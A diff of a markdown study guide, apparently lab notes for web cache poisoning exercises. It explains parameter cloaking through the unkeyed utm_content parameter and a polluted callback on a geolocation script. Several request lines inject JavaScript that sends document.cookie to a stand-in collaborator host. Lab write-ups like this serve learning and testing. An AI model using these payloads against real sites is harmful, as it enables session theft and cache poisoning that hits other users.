@@ -1143,7 +1143,7 @@ GET /?utm_content='/><script>document.location="https://OASTIFY.COM?c="+document
 
 >Last part will be to delete `Origin` header and make the same process with the original request so normal users are victims (the original request that normal website users make is done without `Origin` header). 
 
-### Cloaking utm_content  
+### Cloaking utm_content
 
 >Param Miner extension doing a `Bulk scan > Rails parameter cloaking scan` will ***identify*** the vulnerability automatically. Manually it can be identified by adding `;` to append another parameter to `utm_content`, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key.  
 >The `source code` for `/js/geolocate.js?callback=setCountryCookie` is called on every page and execute callback function.  
@@ -1168,7 +1168,31 @@ GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=docum
 GET/js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='+document.cookie; HTTP/2
 ```  
 
-[PortSwigger Lab: Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)  
+[PortSwigger Lab: Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)
+
+Lab summary:
+
+1. Notice Parameter pollution (server interprets second parameter instead of first one) in `callback` parameter:
+
+![pp](images/parameterPollution.png)
+
+2. Notice unkeyed parameter `utm_content` (not included in cache key)
+
+![pp](images/2-unkeyed_header.png)
+
+Build an attack using `utm_content` to try to pollute `callback` parameter in order to inject code. As `utm_content` is not part of cache key, the original request `/js/geolocate.js?callback=setCountryCookie` request will recieve the polluted cache.
+
+So, first step is to inject code via `;`. Cache interprets the content of `utm_content` as a whole string, but back end server interprets the two fields separated by `;` and does the parameter pollution. 
+
+![pp](images/cloaking1.png)
+
+Any changes in the `utm_content` string will not affect to the cache because it is not part of the cache key and the cache will throw the same cached response. For the cache, `GET /js/geolocate.js?callback=setCountryCookie` is the same as `GET /js/geolocate.js?callback=setCountryCookie&utm_content=blablabla` because the second one is not part of the cache key:
+
+![pp](images/cloaking2.png)
+
+That's why when the victim makes a request to the home page and a `GET /js/geolocate.js?callback=setCountryCookie` is done, the cache answers with polluted cache:
+
+![pp](images/cloaking3.png)
   
 ### Poison ambiguous request  
 
